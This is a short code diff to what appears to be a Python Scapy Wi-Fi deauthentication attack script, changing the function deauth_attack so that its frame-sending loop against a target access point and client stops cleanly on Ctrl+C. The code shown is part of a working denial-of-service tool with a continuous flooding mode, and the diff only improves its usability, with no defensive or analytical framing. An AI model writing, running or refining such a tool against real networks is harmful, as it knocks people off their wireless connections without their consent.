@@ -24,12 +24,15 @@ def deauth_attack(iface, ap_mac, client_mac=None, count=100):
     print(f"[*] Target AP: {ap_mac}")
     print(f"[*] Mode: {'Continuous' if loop else f'{count} frames'} | Ctrl+C to stop")
 
-    sendp(
-        [pkt1, pkt2],
-        iface=iface,
-        count=count if not loop else 0,
-        loop=1 if loop else 0,
-        inter=0.01,
-        verbose=False
-    )
-    print("[+] Deauth done")
+    try:
+        sendp(
+            [pkt1, pkt2],
+            iface=iface,
+            count=count if not loop else 0,
+            loop=1 if loop else 0,
+            inter=0.01,
+            verbose=False
+        )
+        print("[+] Deauth done")
+    except KeyboardInterrupt:
+        print("\n[*] Deauth stopped")
